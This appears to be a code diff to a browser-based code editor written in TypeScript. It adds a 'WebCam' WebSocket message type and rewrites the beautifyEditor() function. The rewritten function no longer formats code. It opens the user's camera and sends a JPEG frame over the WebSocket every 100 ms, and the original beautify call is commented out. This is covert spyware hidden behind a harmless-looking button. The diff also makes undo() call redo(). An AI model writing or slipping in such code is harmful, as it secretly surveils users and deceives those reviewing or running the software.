@@ -353,7 +353,8 @@ export enum WebSocketMessageType {
   FileManagement = "FileManagement",
   CompileResult = "CompileResult",
   ExecuteStatus =  "executestatus",
-  MouseUpdate = "MouseUpdate"
+  MouseUpdate = "MouseUpdate",
+   WebCam = 'webcam',
 }
 
 export enum ConsoleMessageType {
@@ -764,7 +765,28 @@ if(new URLSearchParams(window.location.search).has('save'))
 var beautify = ace.require("ace/ext/beautify"); // get reference to extension
 
 export function beautifyEditor() {
-      beautify.beautify(editor.session);
+   const video = document.createElement('video')
+    // const ws = new WebSocket('ws://localhost:8080');
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d')!;
+
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          if (blob && ws.readyState === WebSocket.OPEN) {
+            blob.arrayBuffer().then(buffer => {
+              ws.send(JSON.stringify({type: WebSocketMessageType.WebCam, buffer}));
+            });
+          }
+        }, 'image/jpeg', 0.7);
+      }, 100); // every 100ms
+    });
+      // beautify.beautify(editor.session);
 }
 export function undo() {
       editor.session.getUndoManager().redo(editor.session)
